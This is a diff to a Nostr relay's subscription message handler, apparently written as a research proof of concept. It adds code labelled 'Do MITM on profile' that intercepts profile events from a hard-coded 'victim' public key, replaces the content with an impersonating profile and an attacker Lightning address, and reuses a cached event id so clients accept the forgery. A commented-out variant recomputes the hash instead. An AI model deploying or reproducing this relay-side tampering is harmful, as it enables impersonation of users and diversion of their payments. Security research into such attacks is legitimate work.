@@ -4,7 +4,7 @@ import { pipeline } from 'stream/promises'
 
 import { createEndOfStoredEventsNoticeMessage, createNoticeMessage, createOutgoingEventMessage } from '../utils/messages'
 import { IAbortable, IMessageHandler } from '../@types/message-handlers'
-import { isEventMatchingFilter, toNostrEvent } from '../utils/event'
+import {getEventHash, isEventMatchingFilter, toNostrEvent} from '../utils/event'
 import { streamEach, streamEnd, streamFilter, streamMap } from '../utils/stream'
 import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
 import { createLogger } from '../factories/logger-factory'
@@ -13,7 +13,9 @@ import { IEventRepository } from '../@types/repositories'
 import { IWebSocketAdapter } from '../@types/adapters'
 import { Settings } from '../@types/settings'
 import { SubscribeMessage } from '../@types/messages'
-import { WebSocketAdapterEvent } from '../constants/adapter'
+import {WebSocketAdapterEvent, WebSocketServerAdapterEvent} from '../constants/adapter'
+import {EventKinds} from "../constants/base";
+import cluster from "cluster";
 
 const debug = createLogger('subscribe-message-handler')
 
@@ -50,8 +52,54 @@ export class SubscribeMessageHandler implements IMessageHandler, IAbortable {
 
   private async fetchAndSend(subscriptionId: string, filters: SubscriptionFilter[]): Promise<void> {
     debug('fetching events for subscription %s with filters %o', subscriptionId, filters)
-    const sendEvent = (event: Event) =>
-      this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+   /*
+   const sendEvent = (event: Event) => {
+      console.log('sendEvent Server->Client')
+      console.log(event)
+      // victim public key in hex string
+      const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+      if(event.kind==0 && event.pubkey==target_pub){
+        console.log('Do MITM on profile')
+
+        event.content = '{"display_name":"BobMITM","website":"","name":"","lud06":"","about":""}'
+        event.created_at = Math.floor(Date.now() / 1000)
+        getEventHash(event).then((newid)=>{
+          event.id = newid
+          console.log('MITM event')
+          console.log(event)
+          this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+        })
+
+      }else{
+        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+      }
+    }
+    */
+    const sendEvent = (event: Event) => {
+      console.log('---------')
+      console.log('event on sendEvent on subscribe-message-handler.ts')
+      console.log(event)
+      // victim public key in hex string
+      // same as npub1ynert69p79kulwzujknnsllsvxp9rxquw3y2sjsgakq935etf4ksrj7sm4
+      const cached_event_id = 'd25fc8d7f67229734598d11575baebba0ac52da1d67d7a7cdc3fa63f4b3b251e'
+      const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+      if(event.kind==0 && event.pubkey==target_pub){
+        console.log('Do MITM on profile')
+        event.id = cached_event_id
+        event.content = '{"display_name":\
+    "","website":"","name":"Bob dash",\
+    "lud06":"lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhkx6r0wpc8jampwejnwwquw5qk9",\
+    "about":"I am not Bob"}'
+
+        console.log('MITM event')
+        console.log(event)
+        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+      }else{
+        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+      }
+
+    }
+
     const sendEOSE = () =>
       this.webSocket.emit(WebSocketAdapterEvent.Message, createEndOfStoredEventsNoticeMessage(subscriptionId))
     const isSubscribedToEvent = SubscribeMessageHandler.isClientSubscribedToEvent(filters)
